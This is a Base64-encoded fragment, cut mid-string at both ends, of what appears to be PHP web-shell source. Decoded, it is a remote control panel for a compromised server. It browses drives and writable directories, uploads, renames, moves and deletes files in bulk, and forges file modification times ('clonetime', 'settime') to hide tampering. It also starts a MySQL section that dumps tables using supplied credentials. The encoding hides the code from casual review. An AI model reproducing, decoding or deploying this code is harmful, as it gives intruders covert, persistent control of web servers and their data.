VjY2VzcycgOiAnZmFpbGVkJykpOwoJCQkJfQoJCQkJYnJlYWs7CgkJCWNhc2UgJ3JlbmFtZSc6CgkJCQkvLyDmlLnlkI0KCQkJCWlmICgkcDIgJiYgJHAzKSB7CgkJCQkJbSgkcDMuJyByZW5hbWVkICcuJHAyLihAcmVuYW1lKCRwMywgJHAyKSA/ICcgc3VjY2VzcycgOiAnIGZhaWxlZCcpKTsKCQkJCX0KCQkJCWJyZWFrOwoJCQljYXNlICdjbG9uZXRpbWUnOgoJCQkJLy8g5YWL6ZqG5pe26Ze0CgkJCQlpZiAoJHAyICYmICRwMykgewoJCQkJCSR0aW1lID0gQGZpbGVtdGltZSgkcDMpOwoJCQkJCW0oJ1NldCBmaWxlIGxhc3QgbW9kaWZpZWQgJy4oQHRvdWNoKCRwMiwkdGltZSwkdGltZSkgPyAnc3VjY2VzcycgOiAnZmFpbGVkJykpOwoJCQkJfQoJCQkJYnJlYWs7CgkJCWNhc2UgJ3NldHRpbWUnOgoJCQkJLy8g6Ieq5a6a5LmJ5pe26Ze0CgkJCQlpZiAoJHAyICYmICRwMykgewoJCQkJCSR0aW1lID0gc3RydG90aW1lKCRwMyk7CgkJCQkJbSgnU2V0IGZpbGUgbGFzdCBtb2RpZmllZCAnLihAdG91Y2goJHAyLCR0aW1lLCR0aW1lKSA/ICdzdWNjZXNzJyA6ICdmYWlsZWQnKSk7CgkJCQl9CgkJCQlicmVhazsKCQkJY2FzZSAnZGVsZXRlJzoKCQkJCS8vIOaJuemHj+WIoOmZpOaWh+S7tgoJCQkJaWYgKCRQWydkbCddKSB7CgkJCQkJJHN1Y2MgPSAkZmFpbCA9IDA7CgkJCQkJZm9yZWFjaCAoJFBbJ2RsJ10gYXMgJGYpIHsKCQkJCQkJaWYgKGlzX2RpcigkY3dkLiRmKSkgewoJCQkJCQkJaWYgKEBkZWx0cmVlKCRjd2QuJGYpKSB7CgkJCQkJCQkJJHN1Y2MrKzsKCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJJGZhaWwrKzsKCQkJCQkJCX0KCQkJCQkJfSBlbHNlIHsKCQkJCQkJCWlmIChAdW5saW5rKCRjd2QuJGYpKSB7CgkJCQkJCQkJJHN1Y2MrKzsKCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJJGZhaWwrKzsKCQkJCQkJCX0KCQkJCQkJfQoJCQkJCX0KCQkJCQltKCdEZWxldGVkIGZvbGRlci9maWxlKHMpIGhhdmUgZmluaXNoZWQsIGNob29zZSAnLmNvdW50KCRQWydkbCddKS4nLCBzdWNjZXNzICcuJHN1Y2MuJywgZmFpbCAnLiRmYWlsKTsKCQkJCX0gZWxzZSB7CgkJCQkJbSgnUGxlYXNlIHNlbGVjdCBmb2xkZXIvZmlsZShzKScpOwoJCQkJfQoJCQkJYnJlYWs7CgkJCWNhc2UgJ3Bhc3RlJzoKCQkJCWlmKCRfU0VTU0lPTlsnZG8nXSA9PSAnY29weScpIHsKCQkJCQlmb3JlYWNoKCRfU0VTU0lPTlsnZGwnXSBhcyAkZikgewoJCQkJCQljb3B5X3Bhc3RlKCRfU0VTU0lPTlsnYyddLCRmLCAkY3dkKTsKCQkJCQl9CgkJCQl9IGVsc2VpZigkX1NFU1NJT05bJ2RvJ10gPT0gJ21vdmUnKSB7CgkJCQkJZm9yZWFjaCgkX1NFU1NJT05bJ2RsJ10gYXMgJGYpIHsKCQkJCQkJQHJlbmFtZSgkX1NFU1NJT05bJ2MnXS4kZiwgJGN3ZC4kZik7CgkJCQkJfQoJCQkJfQoJCQkJdW5zZXQoJF9TRVNTSU9OWydkbyddLCAkX1NFU1NJT05bJ2RsJ10sICRfU0VTU0lPTlsnYyddKTsKCQkJCWJyZWFrOwoJCQlkZWZhdWx0OgoJCQkJaWYoJHAxID09ICdjb3B5JyB8fCAkcDEgPT0gJ21vdmUnKSB7CgkJCQkJaWYgKGlzc2V0KCRQWydkbCddKSAmJiBjb3VudCgkUFsnZGwnXSkpIHsKCQkJCQkJJF9TRVNTSU9OWydkbyddID0gJHAxOwoJCQkJCQkkX1NFU1NJT05bJ2RsJ10gPSAkUFsnZGwnXTsKCQkJCQkJJF9TRVNTSU9OWydjJ10gPSAkUFsnY3dkJ107CgkJCQkJCW0oJ0hhdmUgYmVlbiBjb3BpZWQgdG8gdGhlIHNlc3Npb24nKTsKCQkJCQl9IGVsc2UgewoJCQkJCQltKCdQbGVhc2Ugc2VsZWN0IGZvbGRlci9maWxlKHMpJyk7CgkJCQkJfQoJCQkJfQoJCQkJYnJlYWs7CgkJfQoJCWVjaG8gIjxzY3JpcHQgdHlwZT1cInRleHQvamF2YXNjcmlwdFwiPiQoJ29wZm9ybScpLnAxLnZhbHVlPScnOyQoJ29wZm9ybScpLnAyLnZhbHVlPScnOzwvc2NyaXB0PiI7Cgl9CgkvL+aTjeS9nOWujOavlQoJJGZyZWUgPSBAZGlza19mcmVlX3NwYWNlKCRjd2QpOwoJISRmcmVlICYmICRmcmVlID0gMDsKCSRhbGwgPSBAZGlza190b3RhbF9zcGFjZSgkY3dkKTsKCSEkYWxsICYmICRhbGwgPSAwOwoJJHVzZWQgPSAkYWxsLSRmcmVlOwoJcCgnPGgyPkZpbGUgTWFuYWdlciAtIEN1cnJlbnQgZGlzayBmcmVlICcuc2l6ZWNvdW50KCRmcmVlKS4nIG9mICcuc2l6ZWNvdW50KCRhbGwpLicgKCcuQHJvdW5kKDEwMC8oJGFsbC8kZnJlZSksMikuJyUpPC9oMj4nKTsKCgkkY3dkX2xpbmtzID0gJyc7CgkkcGF0aCA9IGV4cGxvZGUoJy8nLCAkY3dkKTsKCSRuPWNvdW50KCRwYXRoKTsKCWZvcigkaT0wOyRpPCRuLTE7JGkrKykgewoJCSRjd2RfbGlua3MgLj0gJzxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ2ZpbGVcJywgXCcnOwoJCWZvcigkaj0wOyRqPD0kaTskaisrKSB7CgkJCSRjd2RfbGlua3MgLj0gJHBhdGhbJGpdLicvJzsKCQl9CgkJJGN3ZF9saW5rcyAuPSAnXCcpOyI+Jy4kcGF0aFskaV0uJy88L2E+JzsKCX0KCj8+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KZG9jdW1lbnQub25jbGljayA9IHNob3duYXY7CmZ1bmN0aW9uIHNob3duYXYoZSl7Cgl2YXIgc3JjID0gZT9lLnRhcmdldDpldmVudC5zcmNFbGVtZW50OwoJZG97CgkJaWYoc3JjLmlkID09Imp1bXB0byIpIHsKCQkJJCgnaW5wdXRuYXYnKS5zdHlsZS5kaXNwbGF5ID0gIiI7CgkJCSQoJ3BhdGhuYXYnKS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwoJCQlyZXR1cm47CgkJfQoJCWlmKHNyYy5pZCA9PSJpbnB1dG5hdiIpIHsKCQkJcmV0dXJuOwoJCX0KCQlzcmMgPSBzcmMucGFyZW50Tm9kZTsKCX13aGlsZShzcmMucGFyZW50Tm9kZSkKCgkkKCdpbnB1dG5hdicpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CgkkKCdwYXRobmF2Jykuc3R5bGUuZGlzcGxheSA9ICIiOwp9Cjwvc2NyaXB0Pgo8ZGl2IHN0eWxlPSJiYWNrZ3JvdW5kOiNlZWU7bWFyZ2luLWJvdHRvbToxMHB4OyI+Cgk8Zm9ybSBvbnN1Ym1pdD0iZygnZmlsZScsdGhpcy5jd2QudmFsdWUpO3JldHVybiBmYWxzZTsiIG1ldGhvZD0iUE9TVCIgaWQ9ImdvZGlyIiBuYW1lPSJnb2RpciI+CgkJPHRhYmxlIGlkPSJwYXRobmF2IiB3aWR0aD0iMTAwJSIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iNSIgY2VsbHNwYWNpbmc9IjAiPgoJCQk8dHI+CgkJCQk8dGQgd2lkdGg9IjEwMCUiPjw/cGhwIGVjaG8gJGN3ZF9saW5rcy4nIC0gJy5nZXRDaG1vZCgkY3dkKS4nIC8gJy5QZXJtc0NvbG9yKCRjd2QpLmdldFVzZXIoJGN3ZCk7Pz4gKDw/cGhwIGVjaG8gJGRpcl93cml0ZWFibGU7Pz4pPC90ZD4KCQkJCTx0ZCBub3dyYXA+PGlucHV0IGNsYXNzPSJidCIgaWQ9Imp1bXB0byIgbmFtZT0ianVtcHRvIiB2YWx1ZT0iSnVtcCB0byIgdHlwZT0iYnV0dG9uIj48L3RkPgoJCQk8L3RyPgoJCTwvdGFibGU+CgkJPHRhYmxlIGlkPSJpbnB1dG5hdiIgd2lkdGg9IjEwMCUiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjUiIGNlbGxzcGFjaW5nPSIwIiBzdHlsZT0iZGlzcGxheTpub25lOyI+CgkJCTx0cj4KCQkJCTx0ZCBub3dyYXA+Q3VycmVudCBEaXJlY3RvcnkgKDw/cGhwIGVjaG8gJGRpcl93cml0ZWFibGU7Pz4sIDw/cGhwIGVjaG8gZ2V0Q2htb2QoJGN3ZCk7Pz4pPC90ZD4KCQkJCTx0ZCB3aWR0aD0iMTAwJSI+PGlucHV0IGNsYXNzPSJpbnB1dCIgbmFtZT0iY3dkIiB2YWx1ZT0iPD9waHAgZWNobyAkY3dkOz8+IiB0eXBlPSJ0ZXh0IiBzdHlsZT0id2lkdGg6OTklO21hcmdpbjowIDhweDsiPjwvdGQ+CgkJCQk8dGQgbm93cmFwPjxpbnB1dCBjbGFzcz0iYnQiIHZhbHVlPSJHTyIgdHlwZT0ic3VibWl0Ij48L3RkPgoJCQk8L3RyPgoJCTwvdGFibGU+Cgk8L2Zvcm0+Cjw/cGhwCglpZiAoSVNfV0lOKSB7CgkJJGNvbW1hID0gJyc7CgkJcCgnPGRpdiBjbGFzcz0iZHJpdmVzIj4nKTsKCQlmb3JlYWNoKCByYW5nZSgnQScsJ1onKSBhcyAkZHJpdmUgKSB7CgkJCWlmIChpc19kaXIoJGRyaXZlLic6LycpKSB7CgkJCQlwKCRjb21tYS4nPGEgaHJlZj0iamF2YXNjcmlwdDpnKFwnZmlsZVwnLCBcJycuJGRyaXZlLic6L1wnKTsiPicuJGRyaXZlLic6XDwvYT4nKTsKCQkJCSRjb21tYSA9ICc8c3Bhbj58PC9zcGFuPic7CgkJCX0KCQl9CgkJcCgnPC9kaXY+Jyk7Cgl9Cj8+CjwvZGl2Pgo8P3BocAoJcCgnPHRhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSI0IiBjZWxsc3BhY2luZz0iMCI+Jyk7CglwKCc8dHIgY2xhc3M9ImFsdDEiPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0icGFkZGluZzo1cHg7bGluZS1oZWlnaHQ6MjBweDsiPicpOwoJcCgnPGZvcm0gYWN0aW9uPSInLlNFTEYuJyIgbWV0aG9kPSJQT1NUIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj48ZGl2IHN0eWxlPSJmbG9hdDpyaWdodDsiPjxpbnB1dCBuYW1lPSJ1cGxvYWRmaWxlIiB2YWx1ZT0iIiB0eXBlPSJmaWxlIiAvPiA8aW5wdXQgY2xhc3M9ImJ0IiB2YWx1ZT0iVXBsb2FkIiB0eXBlPSJzdWJtaXQiIC8+PGlucHV0IG5hbWU9ImNoYXJzZXQiIHZhbHVlPSInLiRjaGFyc2V0LiciIHR5cGU9ImhpZGRlbiIgLz48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwMSIgdmFsdWU9InVwbG9hZEZpbGUiPjxpbnB1dCBuYW1lPSJjd2QiIHZhbHVlPSInLiRjd2QuJyIgdHlwZT0iaGlkZGVuIiAvPjwvZGl2PjwvZm9ybT4nKTsKCXAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ2ZpbGVcJywgXCcnLnN0cl9yZXBsYWNlKCdcXCcsJy8nLCR3ZWJfY3dkKS4nXCcpOyI+V2ViUm9vdDwvYT4nKTsKCXAoJyB8IDxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ2ZpbGVcJywgXCcnLiRob21lX2N3ZC4nXCcpOyI+U2NyaXB0UGF0aDwvYT4nKTsKCXAoJyB8IDxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ2ZpbGVcJyxcJycuJGN3ZC4nXCcsbnVsbCxudWxsLG51bGwsXCdkaXJcJyk7Ij5WaWV3IFdyaXRhYmxlIERpcmVjdG9yeTwvYT4gJyk7CglwKCcgfCA8YSBocmVmPSJqYXZhc2NyaXB0OmNyZWF0ZWRpcigpOyI+Q3JlYXRlIERpcmVjdG9yeTwvYT4gfCA8YSBocmVmPSJqYXZhc2NyaXB0OmNyZWF0ZWZpbGUoKTsiPkNyZWF0ZSBGaWxlPC9hPicpOwoJcCgnPC90ZD48L3RyPicpOwoKCSRzb3J0ID0gYXJyYXkoJ2ZpbGVuYW1lJywgMSk7CglpZigkcDEpIHsKCQlpZihwcmVnX21hdGNoKCchc18oW0Etel9dKylfKFxkezF9KSEnLCAkcDEsICRtYXRjaCkpIHsKCQkJJHNvcnQgPSBhcnJheSgkbWF0Y2hbMV0sIChpbnQpJG1hdGNoWzJdKTsKCQl9Cgl9CgoJZm9ybWhlYWQoYXJyYXkoJ25hbWUnPT4nZmxpc3QnKSk7CgltYWtlaGlkZSgnYWN0JywnZmlsZScpOwoJbWFrZWhpZGUoJ3AxJywnJyk7CgltYWtlaGlkZSgnY3dkJywkY3dkKTsKCW1ha2VoaWRlKCdjaGFyc2V0JywkY2hhcnNldCk7CglwKCc8dHIgY2xhc3M9ImhlYWQiPicpOwoJcCgnPHRkIHdpZHRoPSIyJSIgbm93cmFwPjxpbnB1dCBuYW1lPSJjaGthbGwiIHZhbHVlPSJvbiIgdHlwZT0iY2hlY2tib3giIG9uY2xpY2s9ImNoZWNrYWxsKHRoaXMuZm9ybSkiIC8+PC90ZD4nKTsKCXAoJzx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OmcoXCdmaWxlXCcsbnVsbCxcJ3NfZmlsZW5hbWVfJy4oJHNvcnRbMV0/MDoxKS4nXCcpOyI+RmlsZW5hbWU8L2E+ICcuKCRwMSA9PSAnc19maWxlbmFtZV8wJyA/ICRkY2hhciA6ICcnKS4oJHAxID09ICdzX2ZpbGVuYW1lXzEnIHx8ICEkcDEgPyAkdWNoYXIgOiAnJykuJzwvdGQ+Jyk7CglwKCc8dGQgd2lkdGg9IjE2JSI+PGEgaHJlZj0iamF2YXNjcmlwdDpnKFwnZmlsZVwnLG51bGwsXCdzX210aW1lXycuKCRzb3J0WzFdPzA6MSkuJ1wnKTsiPkxhc3QgbW9kaWZpZWQ8L2E+ICcuKCRwMSA9PSAnc19tdGltZV8wJyA/ICRkY2hhciA6ICcnKS4oJHAxID09ICdzX210aW1lXzEnID8gJHVjaGFyIDogJycpLic8L3RkPicpOwoJcCgnPHRkIHdpZHRoPSIxMCUiPjxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ2ZpbGVcJyxudWxsLFwnc19zaXplXycuKCRzb3J0WzFdPzA6MSkuJ1wnKTsiPlNpemU8L2E+ICcuKCRwMSA9PSAnc19zaXplXzAnID8gJGRjaGFyIDogJycpLigkcDEgPT0gJ3Nfc2l6ZV8xJyA/ICR1Y2hhciA6ICcnKS4nPC90ZD4nKTsKCXAoJzx0ZCB3aWR0aD0iMjAlIj5DaG1vZCAvIFBlcm1zPC90ZD4nKTsKCXAoJzx0ZCB3aWR0aD0iMjIlIj5BY3Rpb248L3RkPicpOwoJcCgnPC90cj4nKTsKCgkvL+afpeeci+aJgOacieWPr+WGmeaWh+S7tuWSjOebruW9lQoJJGRpcmRhdGE9JGZpbGVkYXRhPWFycmF5KCk7CgoJaWYgKCRwNCA9PSAnZGlyJykgewoJCSRkaXJkYXRhID0gR2V0V0Rpckxpc3QoJGN3ZCk7CgkJJGZpbGVkYXRhID0gYXJyYXkoKTsKCX0gZWxzZSB7CgkJLy8g6buY6K6k55uu5b2V5YiX6KGoCgkJJGRpcnMgPSBAc2NhbmRpcigkY3dkKTsKCQlpZiAoJGRpcnMpIHsKCQkJJGRpcnMgPSBhcnJheV9kaWZmKCRkaXJzLCBhcnJheSgnLicpKTsKCQkJZm9yZWFjaCAoJGRpcnMgYXMgJGZpbGUpIHsKCQkJCSRmaWxlcGF0aD0kY3dkLiRmaWxlOwoJCQkJaWYoQGlzX2RpcigkZmlsZXBhdGgpKXsKCQkJCQkkZGlyZGJbJ2ZpbGVuYW1lJ109JGZpbGU7CgkJCQkJJGRpcmRiWydtdGltZSddPUBkYXRlKCdZLW0tZCBIOmk6cycsZmlsZW10aW1lKCRmaWxlcGF0aCkpOwoJCQkJCSRkaXJkYlsnY2htb2QnXT1nZXRDaG1vZCgkZmlsZXBhdGgpOwoJCQkJCSRkaXJkYlsncGVybSddPVBlcm1zQ29sb3IoJGZpbGVwYXRoKTsKCQkJCQkkZGlyZGJbJ293bmVyJ109Z2V0VXNlcigkZmlsZXBhdGgpOwoJCQkJCSRkaXJkYlsnbGluayddPSRmaWxlcGF0aDsKCQkJCQlpZiAoJGZpbGU9PScuLicpIHsKCQkJCQkJJGRpcmRhdGFbJ3VwJ109MTsKCQkJCQl9IGVsc2UgewoJCQkJCQkkZGlyZGF0YVtdPSRkaXJkYjsKCQkJCQl9CgkJCQl9IGVsc2UgewoJCQkJCSRmaWxlZGJbJ2ZpbGVuYW1lJ109JGZpbGU7CgkJCQkJLy8kZmlsZWRiWydzaXplJ109QGZpbGVzaXplKCRmaWxlcGF0aCk7CgkJCQkJJGZpbGVkYlsnc2l6ZSddPXNwcmludGYoIiV1IiwgQGZpbGVzaXplKCRmaWxlcGF0aCkpOwoJCQkJCSRmaWxlZGJbJ210aW1lJ109QGRhdGUoJ1ktbS1kIEg6aTpzJyxmaWxlbXRpbWUoJGZpbGVwYXRoKSk7CgkJCQkJJGZpbGVkYlsnY2htb2QnXT1nZXRDaG1vZCgkZmlsZXBhdGgpOwoJCQkJCSRmaWxlZGJbJ3Blcm0nXT1QZXJtc0NvbG9yKCRmaWxlcGF0aCk7CgkJCQkJJGZpbGVkYlsnb3duZXInXT1nZXRVc2VyKCRmaWxlcGF0aCk7CgkJCQkJJGZpbGVkYlsnbGluayddPSRmaWxlcGF0aDsKCQkJCQkkZmlsZWRhdGFbXT0kZmlsZWRiOwoJCQkJfQoJCQl9CgkJCXVuc2V0KCRkaXJkYik7CgkJCXVuc2V0KCRmaWxlZGIpOwoJCX0KCX0KCSRkaXJfaSA9ICcwJzsKCWlmIChpc3NldCgkZGlyZGF0YVsndXAnXSkpIHsKCQkkdGhpc2JnID0gYmcoKTsKCQlwKCc8dHIgY2xhc3M9IicuJHRoaXNiZy4nIiBvbm1vdXNlb3Zlcj0idGhpcy5jbGFzc05hbWU9XCdmb2N1c1wnOyIgb25tb3VzZW91dD0idGhpcy5jbGFzc05hbWU9XCcnLiR0aGlzYmcuJ1wnOyI+Jyk7CgkJcCgnPHRkIGFsaWduPSJjZW50ZXIiPi08L3RkPjx0ZCBub3dyYXAgY29sc3Bhbj0iNSI+PGEgaHJlZj0iamF2YXNjcmlwdDpnKFwnZmlsZVwnLFwnJy5nZXRVcFBhdGgoJGN3ZCkuJ1wnKTsiPlBhcmVudCBEaXJlY3Rvcnk8L2E+PC90ZD4nKTsKCQlwKCc8L3RyPicpOwoJfQoJdW5zZXQoJGRpcmRhdGFbJ3VwJ10pOwoJdXNvcnQoJGRpcmRhdGEsICdjbXAnKTsKCXVzb3J0KCRmaWxlZGF0YSwgJ2NtcCcpOwoJZm9yZWFjaCgkZGlyZGF0YSBhcyAka2V5ID0+ICRkaXJkYil7CgkJaWYoJHAxID09ICdnZXRzaXplJyAmJiAkcDIgPT0gJGRpcmRiWydmaWxlbmFtZSddKSB7CgkJCSRhdHRhY2hzaXplID0gZGlyc2l6ZSgkcDIpOwoJCQkkYXR0YWNoc2l6ZSA9IGlzX251bWVyaWMoJGF0dGFjaHNpemUpID8gc2l6ZWNvdW50KCRhdHRhY2hzaXplKSA6ICdVbmtub3duJzsKCQl9IGVsc2UgewoJCQkkYXR0YWNoc2l6ZSA9ICc8YSBocmVmPSJqYXZhc2NyaXB0OmcoXCdmaWxlXCcsIG51bGwsIFwnZ2V0c2l6ZVwnLCBcJycuJGRpcmRiWydmaWxlbmFtZSddLidcJyk7Ij5TdGF0PC9hPic7CgkJfQoJCSR0aGlzYmcgPSBiZygpOwoJCXAoJzx0ciBjbGFzcz0iJy4kdGhpc2JnLiciIG9ubW91c2VvdmVyPSJ0aGlzLmNsYXNzTmFtZT1cJ2ZvY3VzXCc7IiBvbm1vdXNlb3V0PSJ0aGlzLmNsYXNzTmFtZT1cJycuJHRoaXNiZy4nXCc7Ij4nKTsKCQlwKCc8dGQgd2lkdGg9IjIlIiBub3dyYXA+PGlucHV0IG5hbWU9ImRsW10iIHR5cGU9ImNoZWNrYm94IiB2YWx1ZT0iJy4kZGlyZGJbJ2ZpbGVuYW1lJ10uJyI+PC90ZD4nKTsKCQlwKCc8dGQ+PGEgaHJlZj0iamF2YXNjcmlwdDpnKFwnZmlsZVwnLFwnJy4kZGlyZGJbJ2xpbmsnXS4nXCcpIj4nLiRkaXJkYlsnZmlsZW5hbWUnXS4nPC9hPjwvdGQ+Jyk7CgkJcCgnPHRkIG5vd3JhcD48YSBocmVmPSJqYXZhc2NyaXB0OmcoXCduZXd0aW1lXCcsbnVsbCxcJycuJGRpcmRiWydmaWxlbmFtZSddLidcJyk7Ij4nLiRkaXJkYlsnbXRpbWUnXS4nPC9hPjwvdGQ+Jyk7CgkJcCgnPHRkIG5vd3JhcD4nLiRhdHRhY2hzaXplLic8L3RkPicpOwoJCXAoJzx0ZCBub3dyYXA+Jyk7CgkJcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpmaWxlcGVybShcJycuJGRpcmRiWydmaWxlbmFtZSddLidcJywgXCcnLiRkaXJkYlsnY2htb2QnXS4nXCcpOyI+Jy4kZGlyZGJbJ2NobW9kJ10uJzwvYT4gLyAnKTsKCQlwKCc8YSBocmVmPSJqYXZhc2NyaXB0OmZpbGVwZXJtKFwnJy4kZGlyZGJbJ2ZpbGVuYW1lJ10uJ1wnLCBcJycuJGRpcmRiWydjaG1vZCddLidcJyk7Ij4nLiRkaXJkYlsncGVybSddLic8L2E+Jy4kZGlyZGJbJ293bmVyJ10uJzwvdGQ+Jyk7CgkJcCgnPHRkIG5vd3JhcD48YSBocmVmPSJqYXZhc2NyaXB0OnJlbmFtZShcJycuJGRpcmRiWydmaWxlbmFtZSddLidcJyk7Ij5SZW5hbWU8L2E+PC90ZD4nKTsKCQlwKCc8L3RyPicpOwoJCSRkaXJfaSsrOwoJfQoKCXAoJzx0ciBiZ2NvbG9yPSIjZGRkZGRkIiBzdGx5ZT0iYm9yZGVyLXRvcDoxcHggc29saWQgI2ZmZjtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZGRkOyI+PHRkIGNvbHNwYW49IjYiIGhlaWdodD0iNSI+PC90ZD48L3RyPicpOwoJJGZpbGVfaSA9ICcwJzsKCglmb3JlYWNoKCRmaWxlZGF0YSBhcyAka2V5ID0+ICRmaWxlZGIpewoJCSRmaWxldXJsID0gJy8nLnN0cl9yZXBsYWNlKCR3ZWJfY3dkLCcnLCRmaWxlZGJbJ2xpbmsnXSk7CgkJJHRoaXNiZyA9IGJnKCk7CgkJcCgnPHRyIGNsYXNzPSInLiR0aGlzYmcuJyIgb25tb3VzZW92ZXI9InRoaXMuY2xhc3NOYW1lPVwnZm9jdXNcJzsiIG9ubW91c2VvdXQ9InRoaXMuY2xhc3NOYW1lPVwnJy4kdGhpc2JnLidcJzsiPicpOwoJCXAoJzx0ZCB3aWR0aD0iMiUiIG5vd3JhcD48aW5wdXQgbmFtZT0iZGxbXSIgdHlwZT0iY2hlY2tib3giIHZhbHVlPSInLiRmaWxlZGJbJ2ZpbGVuYW1lJ10uJyI+PC90ZD4nKTsKCQlwKCc8dGQ+Jy4oKHN0cnBvcygkZmlsZWRiWydsaW5rJ10sICR3ZWJfY3dkKSAhPT0gZmFsc2UpID8gJzxhIGhyZWY9IicuJGZpbGV1cmwuJyIgdGFyZ2V0PSJfYmxhbmsiPicuJGZpbGVkYlsnZmlsZW5hbWUnXS4nPC9hPicgOiAkZmlsZWRiWydmaWxlbmFtZSddKS4nPC90ZD4nKTsKCQlwKCc8dGQgbm93cmFwPjxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ25ld3RpbWVcJyxudWxsLFwnJy4kZmlsZWRiWydmaWxlbmFtZSddLidcJyk7Ij4nLiRmaWxlZGJbJ210aW1lJ10uJzwvYT48L3RkPicpOwoJCXAoJzx0ZCBub3dyYXA+Jy5zaXplY291bnQoJGZpbGVkYlsnc2l6ZSddKS4nPC90ZD4nKTsKCQlwKCc8dGQgbm93cmFwPicpOwoJCXAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6ZmlsZXBlcm0oXCcnLiRmaWxlZGJbJ2ZpbGVuYW1lJ10uJ1wnLCBcJycuJGZpbGVkYlsnY2htb2QnXS4nXCcpOyI+Jy4kZmlsZWRiWydjaG1vZCddLic8L2E+IC8gJyk7CgkJcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpmaWxlcGVybShcJycuJGZpbGVkYlsnZmlsZW5hbWUnXS4nXCcsIFwnJy4kZmlsZWRiWydjaG1vZCddLidcJyk7Ij4nLiRmaWxlZGJbJ3Blcm0nXS4nPC9hPicuJGZpbGVkYlsnb3duZXInXS4nPC90ZD4nKTsKCQlwKCc8dGQgbm93cmFwPicpOwoJCXAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ2Rvd25cJyxudWxsLFwnJy4kZmlsZWRiWydmaWxlbmFtZSddLidcJyk7Ij5Eb3duPC9hPiB8ICcpOwoJCXAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6ZyhcJ2VkaXRmaWxlXCcsbnVsbCxudWxsLFwnJy4kZmlsZWRiWydmaWxlbmFtZSddLidcJyk7Ij5FZGl0PC9hPiB8ICcpOwoJCXAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6cmVuYW1lKFwnJy4kZmlsZWRiWydmaWxlbmFtZSddLidcJyk7Ij5SZW5hbWU8L2E+Jyk7CgkJcCgnPC90ZD48L3RyPicpOwoJCSRmaWxlX2krKzsKCX0KCXAoJzx0ciBjbGFzcz0iJy5iZygpLicgaGVhZCI+PHRkIGNvbHNwYW49IjUiPjxhIGhyZWY9IiMiIG9uY2xpY2s9IiQoXCdmbGlzdFwnKS5wMS52YWx1ZT1cJ2RlbGV0ZVwnOyQoXCdmbGlzdFwnKS5zdWJtaXQoKTsiPkRlbGV0ZTwvYT4gfCA8YSBocmVmPSIjIiBvbmNsaWNrPSIkKFwnZmxpc3RcJykucDEudmFsdWU9XCdjb3B5XCc7JChcJ2ZsaXN0XCcpLnN1Ym1pdCgpOyI+Q29weTwvYT4gfCA8YSBocmVmPSIjIiBvbmNsaWNrPSIkKFwnZmxpc3RcJykucDEudmFsdWU9XCdtb3ZlXCc7JChcJ2ZsaXN0XCcpLnN1Ym1pdCgpOyI+TW92ZTwvYT4nLihpc3NldCgkX1NFU1NJT05bJ2RvJ10pICYmIEBjb3VudCgkX1NFU1NJT05bJ2RsJ10pID8gJyB8IDxhIGhyZWY9IiMiIG9uY2xpY2s9IiQoXCdmbGlzdFwnKS5wMS52YWx1ZT1cJ3Bhc3RlXCc7JChcJ2ZsaXN0XCcpLnN1Ym1pdCgpOyI+UGFzdGU8L2E+JyA6ICcnKS4nPC90ZD48dGQgYWxpZ249InJpZ2h0Ij4nLiRkaXJfaS4nIGRpcmVjdG9yaWVzIC8gJy4kZmlsZV9pLicgZmlsZXM8L3RkPjwvdHI+Jyk7CglwKCc8L2Zvcm0+PC90YWJsZT4nKTsKfS8vIGVuZCBkaXIKCmVsc2VpZiAoJGFjdCA9PSAnbXlzcWxhZG1pbicpIHsKCSRvcmRlciA9IGlzc2V0KCRQWydvcmRlciddKSA/ICRQWydvcmRlciddIDogJyc7CgkkZGJob3N0ID0gaXNzZXQoJFBbJ2RiaG9zdCddKSA/ICRQWydkYmhvc3QnXSA6ICcnOwoJJGRidXNlciA9IGlzc2V0KCRQWydkYnVzZXInXSkgPyAkUFsnZGJ1c2VyJ10gOiAnJzsKCSRkYnBhc3MgPSBpc3NldCgkUFsnZGJwYXNzJ10pID8gJFBbJ2RicGFzcyddIDogJyc7CgkkZGJuYW1lID0gaXNzZXQoJFBbJ2RibmFtZSddKSA/ICRQWydkYm5hbWUnXSA6ICcnOwoJJHRhYmxlbmFtZSA9IGlzc2V0KCRQWyd0YWJsZW5hbWUnXSkgPyAkUFsndGFibGVuYW1lJ10gOiAnJzsKCglpZiAoJGRvaW5nID09ICdkdW1wJykgewoJCWlmIChpc3NldCgkUFsnYmFrX3RhYmxlJ10pICYmICRQWydiYWtfdGFibGUnXSkgewoJCQkkREIgPSBuZXcgREJfTXlTUUw7CgkJCSREQi0+Y2hhcnNldGRiID0gJGNoYXJzZXRkYjsKCQkJJERCLT5jaGFyc2V0ID0gJGNoYXJzZXQ7CgkJCSREQi0+Y29ubmVjdCgkZGJob3N0LCAkZGJ1c2VyLCAkZGJwYXNzLCAkZGJuYW1lKTsKCQkJaWYgKCRQWydzYXZlYXNmaWxlJ10gJiYgJFBbJ2Jha19wYXRoJ10pIHsKCQkJCSRmcCA9IEBmb3BlbigkUFsnYmFrX3BhdGgnXSwndycpOwoJCQkJaWYgKCRmcCkgewoJCQkJCWZvcmVhY2goJFBbJ2Jha190YWJsZSddIGFzICRrID0+ICR2KSB7Cg